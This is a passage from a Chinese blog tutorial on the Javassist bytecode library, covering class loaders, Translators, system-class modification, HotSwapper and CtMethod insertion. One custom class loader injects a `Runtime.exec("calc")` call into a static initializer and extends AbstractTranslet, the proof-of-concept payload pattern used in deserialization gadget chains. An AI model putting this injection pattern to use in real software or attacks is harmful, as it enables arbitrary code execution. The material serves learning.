<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Bean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleBean</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SimpleBean</span><span class="params">(<span class="type">int</span> age, String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SimpleBean</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>javassistLoader_Learn.java</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.Loader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">javassistLoader_Learn</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">Loader</span> <span class="variable">cl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Loader</span>(pool);</span><br><span class="line"></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ct</span> <span class="operator">=</span> pool.get(<span class="string">&quot;Bean.SimpleBean&quot;</span>);</span><br><span class="line">        ct.setSuperclass(pool.get(<span class="string">&quot;Bean.FatherBean&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> cl.loadClass(<span class="string">&quot;Bean.SimpleBean&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> c.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 可以发现成功继承了父类，说明加载了被修改后的字节</span></span><br><span class="line">        System.out.println(instance.getClass().getSuperclass());</span><br><span class="line">        instance.getClass().getMethod(<span class="string">&quot;setId&quot;</span>,<span class="type">int</span>.class).invoke(instance,<span class="number">21</span>);</span><br><span class="line">        System.out.println(instance.getClass().getMethod(<span class="string">&quot;getId&quot;</span>).invoke(instance));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>通过上面的代码，可以发现 javassist 的 Loader 加载的是修改后的字节码</p>
<h4 id="类加载时"><a href="#类加载时" class="headerlink" title="类加载时"></a>类加载时</h4><p>如果用户希望在加载时按需修改类，则可以向 javassist.Loader 添加事件监听器。当类加载器加载类时会通知监听器。事件监听器类必须实现以下接口：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Translator</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">(ClassPool pool)</span></span><br><span class="line">        <span class="keyword">throws</span> NotFoundException, CannotCompileException;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onLoad</span><span class="params">(ClassPool pool, String classname)</span></span><br><span class="line">        <span class="keyword">throws</span> NotFoundException, CannotCompileException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>当事件监听器通过 addTranslator() 添加到 javassist.Loader 对象时，start() 方法会被调用。在 javassist.Loader 加载类之前，会调用 onLoad() 方法。可以在 onLoad() 方法中修改被加载的类的定义。</p>
<p>例如，下面的事件监听器在类加载之前，将类设为public，并将指定方法修改为 public static 修饰（注意，这里的只能去修改访问权限，不能修改 final 和 static 这种修饰，否则会出现报错，如果不写也会产生报错）</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyTranslator</span> <span class="keyword">implements</span> <span class="title class_">Translator</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">(ClassPool pool)</span> <span class="keyword">throws</span> NotFoundException, CannotCompileException &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onLoad</span><span class="params">(ClassPool pool, String classname)</span> <span class="keyword">throws</span> NotFoundException, CannotCompileException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Translating &quot;</span> + classname);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(classname);</span><br><span class="line">        <span class="comment">// 将类设为 public</span></span><br><span class="line">        cc.setModifiers(Modifier.PUBLIC);</span><br><span class="line">        <span class="comment">// 将指定方法设为 public, 并且要写齐，public 和 static 都要写，否则会产生报错</span></span><br><span class="line">        cc.getDeclaredMethod(<span class="string">&quot;testMethod&quot;</span>).setModifiers(Modifier.PUBLIC | Modifier.STATIC);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>注意，onLoad() 不必调用 toBytecode() 或 writeFile()，因为 javassist.Loader 会调用这些方法来获取类文件。</p>
<p>写个测试类来测试 Translator 功能</p>
<p><strong>TestApp.java</strong> 被加载对象</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestApp</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">testMethod</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;test, test!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Method[] methods = TestApp.class.getDeclaredMethods();</span><br><span class="line">        <span class="keyword">for</span> (Method method : methods) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">modifiers</span> <span class="operator">=</span> method.getModifiers();</span><br><span class="line">            <span class="keyword">if</span> (Modifier.isPublic(modifiers)) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;Method &quot;</span> + method.getName() + <span class="string">&quot; is public&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (Modifier.isPrivate(modifiers)) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;Method &quot;</span> + method.getName() + <span class="string">&quot; is private&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>直接运行为：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Method main is public</span><br><span class="line">Method testMethod is private</span><br></pre></td></tr></table></figure></div>

<p>创建 Loader 来使用 Translator</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.Loader;</span><br><span class="line"><span class="keyword">import</span> javassist.Translator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Translator_Learn</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">Translator</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyTranslator</span>();</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">Loader</span> <span class="variable">cl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Loader</span>();</span><br><span class="line">        cl.addTranslator(pool, t);</span><br><span class="line">        <span class="comment">// 这里的 args 就是触发 TestApp main 方法传入的 args</span></span><br><span class="line">        cl.run(<span class="string">&quot;TestApp&quot;</span>, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>运行结果为：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Translating G1_TestApp</span><br><span class="line">Method testMethod is public</span><br><span class="line">Method main is public</span><br></pre></td></tr></table></figure></div>

<p>此外，还需要注意，TestApp 不能访问 Loader 类，如 Translator_Learn，MyTranslator 和 ClassPool，因为它们是由不同的加载器加载的。 TestApp 类由 javassist.Loader 加载，而加载器类（例如 Translator_Learn）是由默认的 Java 类加载器加载。</p>
<h3 id="自定义类加载器"><a href="#自定义类加载器" class="headerlink" title="自定义类加载器"></a>自定义类加载器</h3><p><strong>G2_SelfClassLoader_Learn.java</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">G2_SelfClassLoader_Learn</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> ClassPool pool;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">G2_SelfClassLoader_Learn</span><span class="params">()</span> <span class="keyword">throws</span> NotFoundException &#123;</span><br><span class="line">        pool = <span class="keyword">new</span> <span class="title class_">ClassPool</span>();</span><br><span class="line">        pool.insertClassPath(<span class="string">&quot;src/main/java/g2_classes&quot;</span>); <span class="comment">// 指定 class 文件位置，该目录不能是程序的 class 输出位置，否则 JVM 会用默认的类加载器去加载该类。</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用 指定类 的 main 方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">G2_SelfClassLoader_Learn</span> <span class="variable">selfLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">G2_SelfClassLoader_Learn</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> selfLoader.loadClass(<span class="string">&quot;G2_TestApp&quot;</span>);</span><br><span class="line">        c.getDeclaredMethod(<span class="string">&quot;main&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String[].class &#125;).invoke(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; args &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(name);</span><br><span class="line">            <span class="comment">// 在这里可以自己自定义去动态修改一些内容</span></span><br><span class="line">            <span class="comment">// 比如像 CC 中常见的那样插入一个弹计算器方法，这样每个使用该加载器加载的类都会弹计算器</span></span><br><span class="line">            pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;%s\&quot;);&quot;</span>;</span><br><span class="line">            cmd = String.format(cmd, <span class="string">&quot;calc&quot;</span>);</span><br><span class="line">            cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">            cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line"></span><br><span class="line"><span class="comment">//            cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span></span><br><span class="line">            <span class="type">byte</span>[] b = cc.toBytecode();</span><br><span class="line">            <span class="keyword">return</span> defineClass(name, b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotFoundException | IOException | CannotCompileException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>G2_TestApp.java</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">G2_TestApp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">G2_TestApp</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello, koishi and shruti!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>G2_TestApp 类是一个应用程序。 要执行此程序，首先将类文件放在 .&#x2F;g2_classes 目录下，它目录不能是程序的 class 输出位置，否则 JVM 会用默认的类加载器去加载该类，它是我们自定义的 G2_SelfClassLoader_Learn 的父加载器。目录名 .&#x2F;g2_classes 由构造函数中的 insertClassPath() 指定。然后运行，则其会去执行 G2_TestApp 的 main 方法。此外，在 defineclass 方法中，还可以使用 javassist 去动态的修改字节码。</p>
<h3 id="修改系统的类"><a href="#修改系统的类" class="headerlink" title="修改系统的类"></a>修改系统的类</h3><p>像 java.lang.String 这样的系统类只能被系统类加载器加载。因此，上面的 SampleLoader 或 javassist.Loader 在加载时不能修改系统类。系统类必须被静态地修改。下面的程序向 java.lang.String 添加一个新字段 hiddenValue</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtField;</span><br><span class="line"><span class="keyword">import</span> javassist.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">G3_JavaOriginClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line">        <span class="type">CtField</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(CtClass.intType, <span class="string">&quot;hiddenValue&quot;</span>, cc);</span><br><span class="line">        f.setModifiers(Modifier.PUBLIC);</span><br><span class="line">        cc.addField(f);</span><br><span class="line">        cc.writeFile(<span class="string">&quot;src/main/java&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>再创建一个测试类：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">G3_TestApp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        System.out.println(String.class.getField(<span class="string">&quot;hiddenValue&quot;</span>).getName());</span><br><span class="line">        <span class="comment">// javac G3_TestApp</span></span><br><span class="line">        <span class="comment">// java -Xbootclasspath/p:. G3_TestApp</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>运行测试类时通过 -Xbootclasspath&#x2F;p 去指定引导类路径，使其能够加载到我们改好的 String 方法。</p>
<p> 使用此技术来覆盖 rt.jar 中的系统类，则不需要再去手动修改。</p>
<h3 id="在运行时重新加载类"><a href="#在运行时重新加载类" class="headerlink" title="在运行时重新加载类"></a>在运行时重新加载类</h3><p>如果 JVM 在启用 JPDA 的情况下启动，那么使用 HotSwapper 可以动态地重新加载其他类。</p>
<p>启动HotSwapperTest 的 VM options 添加如下配置项</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8000</span><br></pre></td></tr></table></figure></div>

<p>此外，HotSwapper 运行需要 tools.jar</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sun<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">scope</span>&gt;</span>system<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">systemPath</span>&gt;</span>$&#123;java.home&#125;/../lib/tools.jar<span class="tag">&lt;/<span class="name">systemPath</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>测试类如下：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"><span class="keyword">import</span> javassist.util.HotSwapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">G4_HotSwapper</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">say</span><span class="params">()</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;whoami???&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 创建线程循环调用Person类的 say 方法 */</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">                person.say();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">100</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Javassist 运行时修改 Person 类的 say 方法 */</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(person.getClass().getName());</span><br><span class="line"></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;say&quot;</span>);</span><br><span class="line">        ctMethod.setBody(<span class="string">&quot;System.out.println(\&quot;Oh, I&#x27;m Ko1sh1!\&quot;);&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * HotSwapper热修改Person类，需要开启 JPDA，监听 8000 端口</span></span><br><span class="line"><span class="comment">         * java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8000</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">HotSwapper</span> <span class="variable">hs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwapper</span>(<span class="number">8000</span>);</span><br><span class="line">        hs.reload(person.getClass().getName(), ctClass.toBytecode());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>结果如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami???</span><br><span class="line">whoami???</span><br><span class="line">whoami???</span><br><span class="line">whoami???</span><br><span class="line">Oh, I&#x27;m Ko1sh1!</span><br><span class="line">Oh, I&#x27;m Ko1sh1!</span><br><span class="line">Oh, I&#x27;m Ko1sh1!</span><br></pre></td></tr></table></figure></div>

<p>可以发现成功修改了其内容</p>
<h2 id="CtMethod-与-CtConstructor-使用"><a href="#CtMethod-与-CtConstructor-使用" class="headerlink" title="CtMethod 与 CtConstructor 使用"></a>CtMethod 与 CtConstructor 使用</h2><p>CtMethod 可以理解成加强版的<code>Method</code>对象。</p>
<p>获得方法：<code>CtMethod m = cc.getDeclaredMethod(MethodName)</code>。</p>
<p>这个类提供了方法 <code>setBody</code> ，<code>insertBefore</code> ，<code>insertAfter</code>， <code>insertAt</code> 等方法，使我们可以便捷的修改方法体。</p>
<h3 id="在方法体的开始-结尾处添加代码"><a href="#在方法体的开始-结尾处添加代码" class="headerlink" title="在方法体的开始&#x2F;结尾处添加代码"></a>在方法体的开始&#x2F;结尾处添加代码</h3><p>CtMethod 和 CtConstructor 提供了 insertBefore()，insertAfter() 和 addCatch() 方法。 它们可以将用 Java 编写的代码片段插入到现有方法中。Javassist 包括一个用于处理源代码的简单编译器，它接收用 Java 编写的源代码，并将其编译成 Java 字节码，并内联方法体中。还可以向 CtMethod 和 CtConstructor 中的 insertAt() 方法提供源代码和原始类定义中的源文件的行号，就可以将编译后的代码插入到指定行号位置。</p>
<p>方法 insertBefore() ，insertAfter()，addCatch() 和 insertAt() 接收一个表示语句或语句块的 String 对象。一个语句是一个单一的控制结构，比如 if 和 while 或者以分号结尾的表达式。语句块是一组用大括号 {} 包围的语句。因此，以下每行都是有效语句或块的示例：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">&#123; System.out.println(<span class="string">&quot;Hello&quot;</span>); &#125;</span><br><span class="line"><span class="keyword">if</span> (i &lt; <span class="number">0</span>) &#123; i = -i; &#125;</span><br></pre></td></tr></table></figure></div>



<p>此外，编译器支持语言扩展，以 $ 开头的几个标识符有特殊的含义：</p>
<table>
<thead>
<tr>
<th>符号</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>$0</code>, <code>$1</code>, <code>$2</code>, …</td>
<td><code>$0 = this; $1 = args[0] .....</code> （如果方法是静态的，则 0 不可用）</td>
</tr>
<tr>
<td><code>$args</code></td>
<td>方法参数数组。它的类型为 <code>Object[]</code></td>
</tr>
<tr>
<td><code>$$</code></td>
<td>所有实参。例如, <code>m($$)</code> 等价于 <code>m($1,$2,</code>…<code>)</code></td>
</tr>
<tr>
<td><code>$cflow(</code>…<code>)</code></td>
<td><code>cflow</code> 变量</td>
</tr>
<tr>
<td><code>$r</code></td>
<td>返回结果的类型，用于强制类型转换</td>
</tr>
<tr>
<td><code>$w</code></td>
<td>包装器类型，用于强制类型转换</td>
</tr>
<tr>
<td><code>$_</code></td>
<td>返回值</td>
</tr>
<tr>
<td><code>$sig</code></td>
<td>类型为 java.lang.Class 的参数类型数组</td>
</tr>
<tr>
<td><code>$type</code></td>
<td>一个 java.lang.Class 对象，表示返回值类型</td>
</tr>
<tr>
<td><code>$class</code></td>
<td>一个 java.lang.Class 对象，表示当前正在修改的类</td>
</tr>
</tbody></table>
<h4 id="0-1-2"><a href="#0-1-2" class="headerlink" title="$0, $1, $2"></a><code>$0</code>, <code>$1</code>, <code>$2</code></h4><p>写个测试类简单看看这三个值的用法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">G5_CtMethod_Learn</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">        <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>&#123;</span><br><span class="line">            System.out.println(a + b);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(<span class="string">&quot;G5_CtMethod_Learn$Test&quot;</span>);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">m</span> <span class="operator">=</span> cc.getDeclaredMethod(<span class="string">&quot;add&quot;</span>);</span><br><span class="line">        m.insertBefore(<span class="string">&quot;&#123; System.out.println($0.getClass().getName());System.out.println(\&quot;first num:\&quot;+$1);\nSystem.out.println(\&quot;second num:\&quot;+$2);&#125;&quot;</span>);</span><br><span class="line">        cc.writeFile(<span class="string">&quot;javassist_learn/src/main/java/class_repository&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; aClass = cc.toClass();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> aClass.newInstance();</span><br><span class="line">        aClass.getDeclaredMethod(<span class="string">&quot;add&quot;</span>, <span class="type">int</span>.class, <span class="type">int</span>.class).invoke(instance, <span class="number">10</span>, <span class="number">20</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>Test 类的字节变为下面这样</p>
